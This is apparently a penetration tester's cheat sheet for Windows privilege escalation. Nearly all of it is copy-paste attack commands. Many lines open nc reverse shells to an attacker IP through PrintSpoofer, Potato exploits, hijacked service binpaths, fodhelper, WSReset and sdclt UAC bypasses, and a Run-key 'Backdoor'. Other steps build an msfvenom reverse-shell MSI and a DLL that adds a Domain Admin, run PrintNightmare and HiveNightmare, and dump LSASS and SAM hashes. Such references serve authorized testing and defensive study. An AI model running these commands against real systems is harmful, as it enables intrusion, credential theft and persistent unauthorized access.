# Windows Privilege Escalation

Escalate privileges on Windows systems through misconfigurations, vulnerable services, weak permissions, token abuse, and kernel exploits.
This phase follows initial access and aims to gain SYSTEM or Administrator-level access for further domain compromise.

## Enumeration Tools

### WinPEAS
```powershell
# Download and run
wget http://10.10.14.5/winPEASx64.exe -O winPEAS.exe
.\winPEAS.exe
```

### Seatbelt
```powershell
# Run all checks
.\Seatbelt.exe all

# Run specific checks
.\Seatbelt.exe user
.\Seatbelt.exe nonstandardServices
```

### PowerUp
```powershell
# Import and run all checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### SharpUp
```cmd
# C# version of PowerUp
.\SharpUp.exe
```

### Watson (Patch Level)
```cmd
# Enumerate missing KBs and suggest exploits
.\Watson.exe
```

### AccessChk (Sysinternals)
```cmd
# Check service permissions
.\accesschk64.exe /accepteula -uwcqv "Authenticated Users" *

# Check directory permissions
.\accesschk64.exe /accepteula -s -d C:\Scripts\

# Check service permissions
.\PsService.exe security <service_name>
```

## Token Privileges Abuse

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

#### Check Current Privileges
```cmd
whoami /priv
```

#### PrintSpoofer (Windows Server 2019 / Windows 10 1809+)
```cmd
# Check if Print Spooler is running
ls \\localhost\pipe\spoolss

# Reverse shell
.\printspoofer.exe -i -c "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"

# From SQL xp_cmdshell
EXEC xp_cmdshell 'C:\Users\Public\printspoofer.exe -i -c "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"';
```

#### JuicyPotato (Windows Server 2016 and earlier)
```cmd
# Get CLSID for your OS version from JuicyPotato repo
# https://github.com/ohpe/juicy-potato/tree/master/CLSID

# Execute with CLSID
.\JuicyPotato.exe -l 4001 -p c:\windows\system32\cmd.exe -c {4661626C-9F41-40A9-B3F5-5580E80CB347} -a "/c C:\Users\Public\nc.exe 10.10.14.5 8443 -e cmd.exe" -t *
```

#### RoguePotato (Alternative for 2019+)
```cmd
.\RoguePotato.exe -r 10.10.14.5 -e "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe" -l 9999
```

### SeDebugPrivilege
```powershell
# Allows attaching to any process and reading memory
# Can dump LSASS for credentials
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### SeTakeOwnershipPrivilege
```cmd
# Take ownership of sensitive files
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant %username%:F
```

## Privileged Groups Abuse

### DNS Admins Group

#### Check Group Membership
```cmd
net user <username> /dom
```

#### Check DNS Service Permissions
```cmd
.\PsService.exe security DNS
```

#### Generate Malicious DLL
```bash
# On attacker machine
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Serve via SMB
smbserver.py -smb2support share $(pwd) -username user -password pass
```

#### Configure DNS to Load DLL
```cmd
# Copy DLL locally
copy \\10.10.14.5\share\adduser.dll C:\Users\Public\Temp\

# Point DNS to malicious DLL (local path)
dnscmd.exe /config /serverlevelplugindll C:\Users\Public\Temp\adduser.dll

# Or use UNC path (requires DC machine account access to share)
dnscmd.exe /config /serverlevelplugindll \\fileserver\share\adduser.dll

# Restart DNS service
sc.exe stop DNS
sc.exe start DNS

# Verify user added to Domain Admins
net group "Domain Admins" /dom
```

#### Cleanup
```cmd
# Check registry key
reg query \\<dc>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Delete malicious DLL path
reg delete \\<dc>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

# Restart DNS
sc.exe start dns
```

### Backup Operators
```cmd
# Can backup SAM/SYSTEM hives
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Extract hashes offline
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### Hyper-V Administrators
```powershell
# Can create/modify VMs and access virtual disks
# Mount VHDX files to access file systems
```

### Print Operators
```cmd
# Can load printer drivers (similar to DNS Admins)
# Can manage printers and print servers
```

### Server Operators
```cmd
# Can start/stop services
# Modify service binpath to execute commands
sc.exe config <service> binpath= "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"
sc.exe start <service>
```

## Service Misconfigurations

### Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check write permissions on path
.\accesschk64.exe /accepteula -uwdq "C:\Program Files\Some Folder\"

# Place malicious executable
copy nc.exe "C:\Program Files\Some.exe"

# Restart service
sc.exe stop <service>
sc.exe start <service>
```

### Weak Service Permissions
```cmd
# Check service permissions
.\accesschk64.exe /accepteula -uwcqv "Authenticated Users" *

# Modify service binary path
sc.exe config <service> binpath= "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"

# Start service
sc.exe start <service>
```

### Weak Service Binary Permissions
```cmd
# Find writable service binaries
.\accesschk64.exe /accepteula -quvw "C:\Program Files\*"

# Replace binary with malicious one
move C:\Program Files\Service\service.exe service.exe.bak
copy nc.exe "C:\Program Files\Service\service.exe"

# Restart service
sc.exe stop <service>
sc.exe start <service>
```

## Scheduled Tasks

### Enumerate Scheduled Tasks
```cmd
# List all tasks
schtasks /query /fo LIST /v

# PowerShell enumeration
Get-ScheduledTask | select TaskName,State
```

### Check Script Permissions
```cmd
# Check if scripts directory is writable
.\accesschk64.exe /accepteula -s -d C:\Scripts\

# Append malicious code to existing script
echo C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe >> C:\Scripts\backup.ps1
```

## Registry Exploits

### AlwaysInstallElevated
```cmd
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi

# Install MSI (runs as SYSTEM)
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

### Autorun Registry Keys
```cmd
# Check autorun locations
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Add malicious entry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"
```

## UAC Bypass

### Check UAC Status
```cmd
# Check if UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Check UAC level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Check current integrity level
whoami /groups | findstr "Mandatory Label"
```

### Check Windows Version
```powershell
[environment]::OSVersion.Version
```

### Fodhelper Bypass (Win10 RS1 - 22H2)
```cmd
# Manual method
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
fodhelper.exe
```

```powershell
# PowerShell script method
Import-Module .\FodhelperUACBypass.ps1
FodhelperUACBypass -program "cmd /c start powershell.exe"
```

### WSReset Bypass (Win10 RS1 - 21H2)
```cmd
# Similar to fodhelper
set REG_KEY=HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe" /f
WSReset.exe
```

### SDCLT Bypass (Win10 RS1 - RS5)
```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "C:\Users\Public\nc.exe 10.10.14.5 4444 -e cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /f
sdclt.exe /KickOffElev
```

## Kernel Exploits

### Enumerate Patch Level
```cmd
# Check installed patches
wmic qfe list

# Check OS version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

### Windows Exploit Suggester
```bash
# On attacker machine
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
```

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
```powershell
# Check if Print Spooler is running
ls \\localhost\pipe\spoolss

# PowerShell PoC (adds local admin)
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

# Verify user created
net user hacker
```

### HiveNightmare (CVE-2021-36934)
```cmd
# Check if vulnerable
icacls C:\Windows\System32\config\SAM

# Copy SAM/SYSTEM hives
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Extract hashes
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

## Credential Hunting

### User Description Fields
```powershell
# Check local user descriptions
Get-LocalUser | select Name,Description

# Check computer description
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

### Registry Credentials
```cmd
# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### Saved Credentials
```cmd
# List saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:DOMAIN\admin "cmd.exe /c whoami > C:\Users\Public\out.txt"
```

### LaZagne (Password Recovery)
```cmd
# Run all modules
.\lazagne.exe all

# Run specific module
.\lazagne.exe browsers
```

### SessionGopher (Saved Sessions)
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
```

## Virtual Disk Files

### Mount VHDX on Windows
```powershell
# Mount VHDX file
Mount-VHD -Path C:\Backups\DC01.vhdx

# Or right-click file and select "Mount"
```

### Mount VMDK on Linux
```bash
# Mount VMDK
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# Mount VHDX
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

### Extract Hashes from Mounted Disk
```bash
# Copy registry hives
cp /mnt/vmdk/Windows/System32/config/SAM .
cp /mnt/vmdk/Windows/System32/config/SYSTEM .
cp /mnt/vmdk/Windows/System32/config/SECURITY .

# Extract hashes
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## Miscellaneous Techniques

### Named Pipes
```cmd
# List named pipes
.\pipelist.exe

# Check pipe permissions
.\accesschk.exe -w \pipe\* -v
```

### DLL Hijacking
```cmd
# Find missing DLLs
.\procmon.exe

# Check write permissions on application directory
.\accesschk64.exe /accepteula -quvw "C:\Program Files\Application\"

# Place malicious DLL
copy evil.dll "C:\Program Files\Application\missing.dll"
```

### Insecure File Permissions
```cmd
# Find writable files in Program Files
.\accesschk64.exe /accepteula -quvws "Everyone" "C:\Program Files"

# Find writable system files
.\accesschk64.exe /accepteula -quvws "Authenticated Users" "C:\Windows"
```

## Notes

**Token Privileges:**
- SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege are commonly found on service accounts (IIS, SQL Server, etc.)
- These privileges allow impersonating other users' security contexts
- Potato exploits abuse NTLM authentication and RPC/DCOM to escalate to SYSTEM

**UAC Bypass Limitations:**
- UAC bypasses only work if you're already in the Administrators group
- They elevate from medium integrity to high integrity (same user, elevated token)
- Do not grant new privileges beyond what the account already has
- Most bypasses rely on auto-elevating Windows binaries and registry hijacking

**Service Exploitation:**
- Always check if you can restart services before exploiting them
- Some services run on boot only
- Modifying critical services can cause system instability

**Kernel Exploits:**
- Use as last resort due to system crash risk
- Always test in lab environment first
- Ensure you have a backup/snapshot before attempting

**Group Memberships:**
- DNS Admins, Backup Operators, Print Operators, Server Operators, and Hyper-V Administrators are high-value groups
- These groups have privileges that can be abused for privilege escalation
- Always enumerate group memberships during initial access

**Virtual Disks:**
- VHDX, VHD, and VMDK files often contain backups of production systems
- Can extract SAM/SYSTEM hives for offline hash cracking
- May contain credentials, SSH keys, or other sensitive data

**Cleanup:**
- Always remove malicious DLLs, registry keys, and user accounts after testing
- Document all changes made during privilege escalation
- Restore service configurations to original state
